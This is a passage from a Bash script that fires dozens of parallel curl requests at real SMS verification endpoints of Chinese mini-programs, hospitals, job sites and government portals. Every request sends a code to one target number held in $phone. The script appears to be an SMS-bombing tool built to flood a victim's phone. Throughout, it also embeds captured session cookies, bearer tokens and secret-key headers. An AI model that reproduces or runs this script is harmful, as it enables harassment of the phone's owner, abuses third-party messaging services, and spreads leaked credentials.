    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxc35283883e1d86d5/240/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"request\": {\"commonIn\": {\"requestId\": \"5cbc9535-fbe7-4f39-8902-37bf8ef68889\", \"channel\": \"\"}, \"phone\": \"$phone\"}}" &
echo "第14个接口运行完毕"

# 第15个请求
curl -X POST "https://ls.xzrcfw.com/App/Sys/SendPhoneCode" \
    -H "Host: ls.xzrcfw.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 131" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx244d94feafd1e7f7/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"requestModel\": {\"phone\": \"$phone\", \"OptionType\": 1, \"Role\": 2}, \"Token\": None, \"Source\": \"MiniProject\", \"Platform\": 2, \"isTibetan\": False}" &
echo "第15个接口运行完毕"

# 第16个请求
curl -X POST "https://qjpt.dypmw.com/api/xilujob.sms/send" \
    -H "Host: qjpt.dypmw.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "xweb_xhr: 1" \
    -H "cityid: 0" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx3a1972bbf0d8aaee/17/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第16个接口运行完毕"
#!/bin/bash

# 第17个请求
curl -X POST "https://www.hnzgfwpt.cn/ums-wechat/sms/send-code" \
    -H "Host: www.hnzgfwpt.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 147" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx66e8d31ce1746b26/15/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "unionid=oLhND6juFSLTyPDtojyUxFrpZQuQ&mobile=$phone&msgPrefix=【河南新就业工会】" &
echo "第17个接口运行完毕"

# 第18个请求
curl -X POST "https://applets.qinyunjiuye.cn/sxzhjy_h5/tel/telmessage/save" \
    -H "Host: applets.qinyunjiuye.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 21" \
    -H "Accept: */*" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
    -H "Origin: https://applets.qinyunjiuye.cn" \
    -H "Sec-Fetch-Site: same-origin" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://applets.qinyunjiuye.cn/sxzhjy_h5/common/register" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -H "Cookie: sxzhjy_h5_JSESSIONID=5a1224a5-8522-4728-98a5-63e77895b46e; x_host_key=18e50dcb1bb-08f9fcecc48af8278514a5c43164c331fa74d2ce" \
    -d "telephone=$phone" &
echo "第18个接口运行完毕"

# 第19个请求
curl -X POST "https://edu.jsgpa.com/admin/apis/user/api/user/send/code" \
    -H "Host: edu.jsgpa.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 32" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxf54a2e4b15af66b6/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\", \"type\": 1}" &
echo "第19个接口运行完毕"

# 第20个请求
curl -X POST "https://eibp-api.ynjspx.cn/before/captcha/smsCode" \
    -H "Host: eibp-api.ynjspx.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxb489afebd817b08c/37/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第20个接口运行完毕"

# 第21个请求
curl -X POST "https://yuanzhijiekeji.cn/api.html" \
    -H "Host: yuanzhijiekeji.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 57" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx5f54ab339a33e547/5/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\", \"code\": \"reg\", \"method\": \"user.sms\"}" &
echo "第21个接口运行完毕"
#!/bin/bash

# 第22个请求
curl -X POST "https://826625173.ehpp.club/weapp/customer/getCheckNo" \
    -H "Host: 826625173.ehpp.club" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "Cookie: koa:sess=eyJza2V5IjoiZTE3Nzc0NTVmNTFhZjQ3ZmFkOThmMTYwOTE2ODVjZTY1OTc4Yzg0MiIsInVzZXJpbmZvIjp7InVpZCI6MzU2OSwib3BlbklkIjoib1dBNmE1WGJGYlVjS3VjS29xOU04R1UweXV1NCIsIm5pY2tOYW1lIjoi5b6u5L+h55So5oi3IiwiYXZhdGFyVXJsIjoiaHR0cHM6Ly90aGlyZHd4LnFsb2dvLmNuL21tb3Blbi92aV8zMi9QT2dFd2g0bUlITzRuaWJIMEtsTUVDTmpqR3hRVXEyNFpFYUdUNHBvQzZpY1JpY2NWR0tTeVh3aWJjUHE0QldtaWFJR3VHMWljd3hhUVg2Z3JDOVZlbVpvSjhyZy8xMzIiLCJyZWFsTmFtZSI6bnVsbCwiZ2VuZGVyIjowLCJwcm92aW5jZSI6IiIsImNvdW50cnkiOiIiLCJjaXR5IjoiIiwiY29tcGFueU5hbWUiOm51bGwsImNvbXBhbnlpZCI6bnVsbCwiYm9udXMiOjAsInRvdGFsX2JvbnVzIjowLCJsYXN0X3VwbG9hZF9ydW5fdGltZSI6bnVsbCwiY3JlYXRlX3RpbWUiOiIyMDI0LTAzLTIyVDA1OjE2OjA3LjAwMFoiLCJhaWQiOm51bGwsInBob25lIjoiIiwibWVtYmVyIjowLCJtZW1iZXJfdXBkYXRlIjoiMjAyNC0wMy0yMlQwNToxNjowNy4wMDBaIiwibWVtYmVyX2xldmVsIjpudWxsfSwiX2V4cGlyZSI6MTcxMTY4OTM2NzI3MiwiX21heEFnZSI6NjA0ODAwMDAwfQ==; path=/; expires=Fri, 29 Mar 2024 05:16:07 GMT; httponly" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx10456ccd8ac36129/29/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第22个接口运行完毕"

# 第23个请求
curl -X POST "https://media.hzj7.com/index.php/App800/Login/phone_code" \
    -H "Host: media.hzj7.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx26b5da4a7499bd28/10/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "phone=$phone" &
echo "第23个接口运行完毕"

# 第26个请求
curl -X POST "https://shop.zdjt.com/api.html" \
    -H "Host: shop.zdjt.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 58" \
    -H "Accept: application/json" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx90330e7d263388a9/57/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\", \"code\": \"bind\", \"method\": \"user.sms\"}" &
echo "第24个接口运行完毕"

# 第27个请求
curl -X POST "https://smart.shuye.com/api/sms/send" \
    -H "Host: smart.shuye.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 40" \
    -H "xweb_xhr: 1" \
    -H "Accept-Language: zh-cn" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: [object Null]" \
    -H "Content-Type: application/json; charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxd244e1bddbd29494/10/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -d "{\"mobile\": \"$phone\", \"event\": \"login\"}" &
echo "第25个接口运行完毕"
#!/bin/bash

# 第28个请求
curl -G "https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/" \
    -H "Host: delivery-api.imdada.cn" \
    -H "Enable-Gps: 0" \
    -H "App-Name: i-dada" \
    -H "Unique-Id: 344EF073-E5E4-42FC-A354-36148D490572" \
    -H "Location-Time: 1714966492526" \
    -H "Platform: iOS" \
    -H "Accept: */*" \
    -H "Locate-Error-Code: -1" \
    -H "Accept-Encoding: gzip;q=1.0, compress;q=0.5" \
    -H "Request-Id: 18929FFB-5AE9-42E1-8646-3D1C29CD43EF" \
    -H "Locate-Altitude: 0" \
    -H "User-Agent: DadaStaff/11.59.1 (com.dada.staff; build:210332; iOS 16.6.1) Alamofire/11.59.1" \
    -H "Locate-Extra: {\"Locate-Provider-Str\":\"unknown\",\"Locate-Time-App\":\"\",\"Locate-Device-Id\":\"344EF073-E5E4-42FC-A354-36148D490572\",\"Locate-Work-Mode\":\"0\",\"Locate-Time-Sdk\":\"0\",\"Locate-Time\":\"1714966492526\",\"Locate-Platform\":\"iOS\",\"Locate-AdCode\":\"0\",\"Locate-ForeGround\":1,\"Locate-Error-Flag\":false}" \
    -H "Operator: unknow" \
    -H "UUID: 344EF073-E5E4-42FC-A354-36148D490572" \
    -H "Work-Mode: 0" \
    -H "Network: wifi" \
    -H "Ad-Code: 0" \
    -H "User-Token: user_token" \
    -H "Locate-Speed: 0" \
    -H "Verification-Hash: bc83fdc4d52ca1e0b0fd4ad00e0fc381" \
    -H "Locate-Type: 2" \
    -H "OS-Version: 16.6.1" \
    -H "City-Code: 0" \
    -H "Model: iPhone12,1" \
    -H "Accept-Language: zh-Hans-CN;q=1.0" \
    -H "Lng: 0" \
    -H "User-Id: 0" \
    -H "Locate-Direction: 0" \
    -H "Rate-Limit-Hash: 81326c6aa3590526572434ef4ef40864" \
    -H "Model-Type: iPhone12,1" \
    -H "Client-Time: 1714966492526" \
    -H "Lat: 0" \
    -H "Locate-From: 1" \
    -H "Connection: keep-alive" \
    -H "Channel-ID: A01" \
    -H "City-Id: 0" \
    -H "App-Version: 11.59.1" \
    -H "Sdcard-Id: 344EF073-E5E4-42FC-A354-36148D490572" \
    -H "Location-Provider: 0" \
    --data-urlencode "phone=$phone" \
    --data-urlencode "type=2" &
echo "第28个接口运行完毕"

# 第29个请求
curl -X POST "https://weixin-nj.pcmh.com.cn/sms-gateway/aliyun/identity-verification?organization-id=11510901345812856P" \
    -H "Host: weixin-nj.pcmh.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx43f08083ad884950/20/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第29个接口运行完毕"

# 第30个请求
curl -X POST "https://www.hylyljk.com/ymm-common/sms/sendSmsCode" \
    -H "Host: www.hylyljk.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "userType: 2" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx155e63b80773f98c/7/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第30个接口运行完毕"

# 第31个请求
curl -X POST "https://api.zyydjk.net/message/public/sendSms" \
    -H "Host: api.zyydjk.net" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 49" \
    -H "deviceId: 1234567890-1234567890-1234567890" \
    -H "source: yyMiniApp" \
    -H "product: yyMiniApp" \
    -H "authorization: bearer oHY_55PTtR6BhnMQXQFTuI0EMk3A" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "openId: 1234567890-1234567890-1234567890" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxbe9f76c35c45111c/44/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\", \"MethodWay\": 1, \"Product\": 1}" &
echo "第31个接口运行完毕"
#!/bin/bash

# 第100个请求
curl -X POST "https://product.yl1001.com/api-yp/register/sendSmsCode" \
    -H "Host: product.yl1001.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "id: 0" \
    -H "X-Tingyun: c=B|685-c1OYjko" \
    -H "Content-Type: application/json; charset=UTF-8" \
    -H "Accept: application/json, text/plain, */*" \
    -H "SecretKey: 94cbe78f3bcec8be81d68e7bdfb9ad9b" \
    -H "xweb_xhr: 1" \
    -H "uid: 0" \
    -H "platform: 1" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxcbfa127f857c2790/308/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第32个接口运行完毕"

# 第34个请求
curl -X POST "https://superdesk.avic-s.com/super_cloud/api/wechat/front/smsCode" \
    -H "Host: superdesk.avic-s.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 34" \
    -H "Accept: application/json, text/plain, */*" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx0efbe4601aed7dfe/49/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "mobile=$phone&orgId=-1&type=0" &
echo "第34个接口运行完毕"

# 第35个请求
curl -X POST "https://wx-prm.bshcn.com.cn/*.jsonRequest" \
    -H "Host: wx-prm.bshcn.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 46" \
    -H "B-Product-Code: hcn.sh-pdxqrmyy.patient_mini" \
    -H "B-Version: 1.2.2.8" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "T-Product-Code: hcn.sh-pdxqrmyy.patient_mini" \
    -H "X-Service-Method: registerSmsCodeNew" \
    -H "xweb_xhr: 1" \
    -H "X-Access-Token: " \
    -H "X-Service-Id: cas.wxregisterService" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxca096f515338c55b/159/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "[\"hcn.sh-pdxqrmyy.patient_mini\",\"$phone\"]" &
echo "第35个接口运行完毕"

# 第36个请求
curl -X POST "https://user.zjzwfw.gov.cn/nuc/reg/sendSmsCode" \
    -H "Host: user.zjzwfw.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "guc-accountType: person" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "ak: ak" \
    -H "guc-platform: weixin" \
    -H "xweb_xhr: 1" \
    -H "guc-endpoint: C" \
    -H "X-Site-Code: 339900" \
    -H "X-Device-Id: 37a4be4390593c68963e5ab24bc7e209" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx289ade03af020941/39/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第36个接口运行完毕"

# 第37个请求
curl -X POST "https://96885wx.hrss.jl.gov.cn/minifast/frontRestService/frontBcpDataRestService/getBcpData" \
    -H "Host: 96885wx.hrss.jl.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 95" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx93486ef87cedbd44/139/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"methodName\":\"JRZX_093\",\"loginNo\":\"$phone\",\"loginType\":\"10\",\"yae100\":\"12\",\"siteToken\":\"\"}" &
echo "第37个接口运行完毕"
#!/bin/bash

# 第38个请求
curl -X POST "https://m.52xiaoyuan.cn/mapp/getMappSmsCode" \
    -H "Host: m.52xiaoyuan.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 45" \
    -H "dhash: eda4e699e178c69039367ce5f7b871dd" \
    -H "ts: 1711226083884510;ede6895b37b5d7f5e18f74cc6334c855" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: bafcee32-6075-4a58-bbe4-a17bc253939a" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx56c43729cf6a360a/25/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\", \"module\": \"xykt_gctc\"}" &
echo "第38个接口运行完毕"

# 第39个请求
curl -X POST "https://sqsz.shiyan.gov.cn/smartCommunity/appsend/sendCode?time=1711225888672&sign=516256e7e7ae11f7ac9a51eb6c4e0da4" \
    -H "Host: sqsz.shiyan.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 95" \
    -H "clientinfo: {\"devid\":\"\"}" \
    -H "xweb_xhr: 1" \
    -H "headdata: %7B%22data_value%22%3A%2217343387439%22%2C%22flag%22%3A0%2C%22send_type%22%3A1%2C%22communityId%22%3A6%2C%22roleId%22%3A2%2C%22user_id%22%3A246756%7D" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx75e106ac21a7eea8/46/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"data_value\": \"$phone\", \"flag\": 0, \"send_type\": 1, \"communityId\": 6, \"roleId\": 2, \"user_id\": 246756}" &
echo "第39个接口运行完毕"

# 第40个请求
curl -X POST "https://ehr-recruitment.yifengx.com/restful/login/sendMessage" \
    -H "Host: ehr-recruitment.yifengx.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx1768e077cefc65b1/79/page-frame.html" \
